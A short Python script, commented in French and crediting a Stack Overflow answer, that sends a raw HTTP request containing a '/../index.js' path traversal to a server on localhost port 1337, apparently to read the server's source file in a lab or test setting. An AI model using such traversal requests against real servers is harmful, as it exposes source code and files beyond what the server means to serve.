''' 
ce code provient en majorité du lien suivant:
https://stackoverflow.com/a/45708544/4009787
'''
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('localhost',1337))
request = b'GET http://localhost:1337/../index.js HTTP/1.1\n\n'
s.send(request)
print(s.recv(4096).decode())
